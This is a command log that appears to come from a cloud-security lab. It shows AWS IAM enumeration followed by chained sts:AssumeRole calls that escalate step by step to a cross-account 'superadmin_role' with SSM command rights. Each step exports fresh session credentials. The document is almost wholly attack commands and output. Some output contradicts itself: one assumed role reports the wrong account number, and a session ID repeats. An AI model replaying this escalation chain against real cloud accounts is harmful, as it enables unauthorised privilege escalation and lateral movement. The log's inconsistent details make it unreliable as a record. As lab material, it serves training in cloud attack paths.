aws sts get-caller-identity
```
{
    "UserId": "AIDA26CUPKHDYXQ3FL3Y3",
    "Account": "751796441543",
    "Arn": "arn:aws:iam::751796441543:user/{PLACEHOLDER_LAB_NAME}_ApplicationDeployment"
}
```

aws iam list-attached-role-policies --role-name CustomAdministratorAccess
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "src_custom_iam_ro_src_dst_iam_policy",
            "PolicyArn": "arn:aws:iam::751796441543:policy/src_custom_iam_ro_src_dst_iam_policy"
        },
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}

```

aws iam get-policy-version --policy-arn arn:aws:iam::751796441543:policy/src_custom_iam_ro_src_dst_iam_policy --version-id v1
```
{
    "PolicyVersion": {
        "Document": {
            "Statement": [
                {
                    "Action": [
                        "iam:UpdateAssume*",
                        "iam:List*",
                        "iam:Get*"
                    ],
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:iam::751796441543:role/*",
                        "arn:aws:iam::751796441543:policy/*"
                    ],
                    "Sid": "CustomIamPolicy1"
                },
                {
                    "Action": "sts:AssumeRole",
                    "Effect": "Allow",
                    "Resource": [
                        "arn:aws:iam::833905751850:role/readonly_role",
                        "arn:aws:iam::751796441543:role/*"
                    ],
                    "Sid": "CustomIamPolicy2"
                }
            ],
            "Version": "2012-10-17"
        },
        "VersionId": "v1",
        "IsDefaultVersion": true,
        "CreateDate": "2022-07-21T14:35:42Z"
    }
}

```

output=`aws sts assume-role --role-arn "arn:aws:iam::751796441543:role/CustomAdministratorAccess" --role-session-name "coucou"`
aws_access_key_id=`echo $output | jq -r '. | .Credentials.AccessKeyId'`
aws_secret_access_key=`echo $output | jq -r '. | .Credentials.SecretAccessKey'`
aws_session_token=`echo $output | jq -r '. | .Credentials.SessionToken'`

export AWS_ACCESS_KEY_ID=$aws_access_key_id
export AWS_SECRET_ACCESS_KEY=$aws_secret_access_key
export AWS_SESSION_TOKEN=$aws_session_token

aws sts get-caller-identity
```
{
    "UserId": "AROA2P7MIMDIPOKWFMNDD:coucou",
    "Account": "721513111760",
    "Arn": "arn:aws:sts::721513111760:assumed-role/CustomAdministratorAccess/coucou"
}
```

output2=`aws sts assume-role --role-arn arn:aws:iam::833905751850:role/readonly_role --role-session-name coucou2`
aws_access_key_id=`echo $output2 | jq -r '. | .Credentials.AccessKeyId'`
aws_secret_access_key=`echo $output2 | jq -r '. | .Credentials.SecretAccessKey'`
aws_session_token=`echo $output2 | jq -r '. | .Credentials.SessionToken'`

export AWS_ACCESS_KEY_ID=$aws_access_key_id
export AWS_SECRET_ACCESS_KEY=$aws_secret_access_key
export AWS_SESSION_TOKEN=$aws_session_token

aws sts get-caller-identity
```
{
    "UserId": "AROA2P7MIMDIPOKWFMNDD:coucou2",
    "Account": "833905751850",
    "Arn": "arn:aws:sts::833905751850:assumed-role/readonly_role/coucou2"
}
```

aws iam list-roles
```
        {
            "Path": "/",
            "RoleName": "superadmin_role",
            "RoleId": "AROA4EKFH64VB55QT74PE",
            "Arn": "arn:aws:iam::833905751850:role/superadmin_role",
            "CreateDate": "2022-07-21T14:35:57Z",
            "AssumeRolePolicyDocument": {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Sid": "",
                        "Effect": "Allow",
                        "Principal": {
                            "AWS": "arn:aws:iam::751796441543:role/moniroting_all_role"
                        },
                        "Action": "sts:AssumeRole"
                    }
                ]
            },
            "MaxSessionDuration": 3600
        }

```

aws iam list-attached-role-policies --role-name superadmin_role
```
{
    "AttachedPolicies": [
        {
            "PolicyName": "custom_s3_ro_iam_policy",
            "PolicyArn": "arn:aws:iam::833905751850:policy/custom_s3_ro_iam_policy"
        },
        {
            "PolicyName": "dest_custom_iam_ro_iam_policy",
            "PolicyArn": "arn:aws:iam::833905751850:policy/dest_custom_iam_ro_iam_policy"
        },
        {
            "PolicyName": "ssmSendCommand_policy",
            "PolicyArn": "arn:aws:iam::833905751850:policy/ssmSendCommand_policy"
        }
    ]
}
```

unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

output3=`aws sts assume-role --role-arn arn:aws:iam::751796441543:role/moniroting_all_role --role-session-name coucou3`
aws_access_key_id=`echo $output3 | jq -r '. | .Credentials.AccessKeyId'`
aws_secret_access_key=`echo $output3 | jq -r '. | .Credentials.SecretAccessKey'`
aws_session_token=`echo $output3| jq -r '. | .Credentials.SessionToken'`

export AWS_ACCESS_KEY_ID=$aws_access_key_id
export AWS_SECRET_ACCESS_KEY=$aws_secret_access_key
export AWS_SESSION_TOKEN=$aws_session_token

aws sts get-caller-identity
```
{
    "UserId": "AROA26CUPKHDV57C5XE7O:coucou3",
    "Account": "751796441543",
    "Arn": "arn:aws:sts::751796441543:assumed-role/moniroting_all_role/coucou3"
}
```

output4=`aws sts assume-role --role-arn arn:aws:iam::833905751850:role/superadmin_role --role-session-name coucou4`
aws_access_key_id=`echo $output4 | jq -r '. | .Credentials.AccessKeyId'`
aws_secret_access_key=`echo $output4 | jq -r '. | .Credentials.SecretAccessKey'`
aws_session_token=`echo $output4| jq -r '. | .Credentials.SessionToken'`

export AWS_ACCESS_KEY_ID=$aws_access_key_id
export AWS_SECRET_ACCESS_KEY=$aws_secret_access_key
export AWS_SESSION_TOKEN=$aws_session_token

aws sts get-caller-identity
```
{
    "UserId": "AROA4EKFH64VB55QT74PE:coucou4",
    "Account": "833905751850",
    "Arn": "arn:aws:sts::833905751850:assumed-role/superadmin_role/coucou4"
}
```
